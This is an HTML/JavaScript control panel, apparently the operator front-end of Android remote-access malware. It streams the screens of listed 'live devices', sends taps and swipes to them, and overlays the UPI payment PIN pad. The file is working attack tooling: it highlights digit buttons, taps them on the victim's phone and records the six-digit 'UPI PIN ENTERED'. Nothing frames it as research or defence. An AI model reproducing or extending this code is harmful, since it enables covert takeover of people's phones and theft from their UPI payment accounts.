<!DOCTYPE html>
<html>
<head>
    <title>üì± UPI Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 20px; left: 20px; background: rgba(0,0,0,0.95); 
            padding: 25px; max-height: 80vh; overflow-y: auto; width: 300px; 
            border-radius: 20px; backdrop-filter: blur(25px); border: 1px solid #333;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        .device { 
            padding: 20px; margin: 12px 0; background: #222; cursor: pointer; 
            border-radius: 15px; transition: all 0.3s; border: 1px solid #444; 
            position: relative; overflow: hidden;
        }
        .device:hover { background: #333; transform: translateX(10px); }
        .device.active { 
            background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
            color: #000; box-shadow: 0 0 30px #00ff88; 
        }
        .device-status { font-size: 12px; margin-top: 5px; }
        .status-live { color: #00ff88 !important; }
        .status-off { color: #ff6b6b !important; }

        #phone-frame {
            width: 400px; height: 860px; margin: 40px auto; 
            background: #111; border: 35px solid #222; border-radius: 70px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 0 25px rgba(255,255,255,0.05);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 30px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 30px; z-index: 20;
        }
        .pin-highlight {
            position: absolute; background: rgba(255,69,0,0.6) !important; 
            border: 3px solid #ff4500 !important; border-radius: 8px !important;
            box-shadow: 0 0 20px rgba(255,69,0,0.8) !important;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.25); 
            border: 2px solid #00ff88; border-radius: 6px; transition: all 0.2s;
        }
        .layout-element:hover { 
            background: rgba(0,255,136,0.5) !important; 
            transform: scale(1.05) !important; box-shadow: 0 0 15px #00ff88;
        }

        #stats { 
            position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.9); 
            padding: 20px; border-radius: 15px; font-size: 14px; text-align: center; 
            backdrop-filter: blur(15px); border: 1px solid #333; min-width: 200px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
        }
        #controls { 
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 12px; background: rgba(0,0,0,0.95); padding: 20px 30px;
            border-radius: 35px; backdrop-filter: blur(25px); border: 1px solid #444;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        button {
            padding: 15px 25px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-weight: 600; font-size: 14px; transition: all 0.3s; 
            box-shadow: 0 8px 25px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-4px); box-shadow: 0 12px 35px rgba(0,123,255,0.6); }
        .layout-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-btn.active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; }
        #pin-sequence { margin-top: 10px; font-size: 16px; font-weight: bold; color: #00ff88; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88; text-align: center;">üì± Live Devices</h3>
        <div id="device-list">üîÑ Scanning...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status">üî¥ OFFLINE</span></div>
        <div>FPS: <span id="fps">0</span> | Latency: <span id="latency">0ms</span></div>
        <div>Device: <span id="deviceName">-</span></div>
        <div>PINs Found: <span id="pinCount">0</span></div>
        <div id="layoutStatus">Layout: OFF</div>
        <div id="pin-sequence">PIN: </div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button class="layout-btn" id="layoutBtn" onclick="toggleLayout()">üó∫Ô∏è Layout</button>
        <button onclick="toggleFullscreen()">‚õ∂ Fullscreen</button>
        <button onclick="clearPin()">üóëÔ∏è Clear PIN</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2340;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = false;
        let layoutElements = [];
        let pinSequence = [];
        let canvas, overlayCanvas, phoneFrame;

        canvas = document.getElementById('screen-canvas');
        overlayCanvas = document.getElementById('layout-overlay');
        phoneFrame = document.getElementById('phone-frame');
        const ctx = canvas.getContext('2d');
        const overlayCtx = overlayCanvas.getContext('2d');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE';
            document.getElementById('status').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• ULTRA SMOOTH 60FPS RENDERING
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameQueue.push(data);
            if (frameQueue.length === 1) {
                renderNextFrame();
            }
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.imageSmoothingEnabled = false;
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                // üî• LAYOUT OVERLAY
                if (showLayout && data.layout && data.layout.length > 0) {
                    renderPinLayout(data.layout, rect);
                    document.getElementById('pinCount').textContent = data.layout.length;
                } else {
                    document.getElementById('pinCount').textContent = '0';
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            img.src = `data:image/jpeg;base64,${data.data}`;
        }

        function renderPinLayout(layout, rect) {
            overlayCtx.clearRect(0, 0, canvas.width, canvas.height);
            layoutElements = [];
            
            layout.forEach((element) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const isPin = /\d/.test(element.text || element.contentDesc || '');
                const className = element.className || '';
                
                overlayCtx.fillStyle = isPin ? 'rgba(255,69,0,0.4)' : 'rgba(0,255,136,0.25)';
                overlayCtx.strokeStyle = isPin ? '#ff4500' : '#00ff88';
                overlayCtx.lineWidth = 3;
                overlayCtx.strokeRect(x, y, w, h);
                
                // üî• PIN NUMBER LABEL
                overlayCtx.fillStyle = isPin ? '#fff' : '#00ff88';
                overlayCtx.font = 'bold 18px monospace';
                overlayCtx.shadowColor = '#ff4500';
                overlayCtx.shadowBlur = 10;
                const label = element.text || element.contentDesc || '?';
                overlayCtx.fillText(label, x + 8, y + 25);
                
                layoutElements.push({ 
                    x, y, w, h, isPin, 
                    element, 
                    centerX: element.bounds.centerX,
                    centerY: element.bounds.centerY
                });
            });
        }

        function updateDeviceList(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${info.connected ? '' : 'status-off'}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${(info.model || id).slice(0,15)}</b><br>
                        <small>${info.brand || 'Android'}</small><br>
                        <div class="device-status">
                            <span class="${info.connected ? 'status-live' : 'status-off'}">
                                ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                            </span>
                        </div>
                    </div>
                `).join('') : '<div style="color:#666; text-align:center; padding:20px;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
        }

        // üî• PRECISE TOUCH CONTROL
        function getDeviceCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // PERFECT MOUSE + TOUCH
        const events = ['mousedown', 'mousemove', 'mouseup', 'touchstart', 'touchmove', 'touchend'];
        events.forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                let clientX, clientY;
                
                if (event.includes('touch')) {
                    const touch = e.touches[0] || e.changedTouches[0];
                    clientX = touch.clientX;
                    clientY = touch.clientY;
                } else {
                    clientX = e.clientX;
                    clientY = e.clientY;
                }
                
                const coords = getDeviceCoords(clientX, clientY);
                
                if (event === 'mousedown' || event === 'touchstart') {
                    isDragging = true;
                    dragStart = coords;
                    sendTap(coords.x, coords.y);
                } else if ((event === 'mousemove' || event === 'touchmove') && isDragging) {
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                } else if (event === 'mouseup' || event === 'touchend') {
                    isDragging = false;
                }
            }, { passive: false });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 200 
            });
        }

        function sendBack() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); 
        }
        function sendHome() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); 
        }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            const status = document.getElementById('layoutStatus');
            btn.textContent = showLayout ? '‚ùå Hide Layout' : 'üó∫Ô∏è Show Layout';
            btn.classList.toggle('active');
            status.textContent = `Layout: ${showLayout ? 'ON - PINs Visible' : 'OFF'}`;
            status.style.color = showLayout ? '#00ff88' : '#aaa';
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        function clearPin() {
            pinSequence = [];
            document.getElementById('pin-sequence').textContent = 'PIN: ';
        }

        // üî• DIRECT PIN TAP - ONE CLICK PIN ENTRY
        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice) return;
            
            const rect = phoneFrame.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (deviceWidth / rect.width);
            const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
            
            const clickedPin = layoutElements.find(el => 
                x >= el.x * (deviceWidth / rect.width) && 
                x <= (el.x + el.w) * (deviceWidth / rect.width) &&
                y >= el.y * (deviceHeight / rect.height) && 
                y <= (el.y + el.h) * (deviceHeight / rect.height) &&
                el.isPin
            );
            
            if (clickedPin) {
                const pinNum = clickedPin.element.text || clickedPin.element.contentDesc || '0';
                pinSequence.push(pinNum);
                
                sendTap(clickedPin.centerX, clickedPin.centerY);
                document.getElementById('pin-sequence').textContent = `PIN: ${pinSequence.join('')}`;
                
                console.log(`üéØ PIN ${pinNum} TAPPED! Sequence: ${pinSequence.join('')}`);
                
                // üî• AUTO CONFIRM AFTER 6 DIGITS
                if (pinSequence.length === 6) {
                    setTimeout(() => {
                        console.log('‚úÖ UPI PIN ENTERED:', pinSequence.join(''));
                        // Optional: Auto confirm button search
                    }, 500);
                }
            }
        });

        // PING UPDATE
        setInterval(() => {
            const start = performance.now();
            socket.emit('ping', () => {
                document.getElementById('latency').textContent = 
                    Math.round(performance.now() - start) + 'ms';
            });
        }, 2000);
    </script>
</body>
</html>
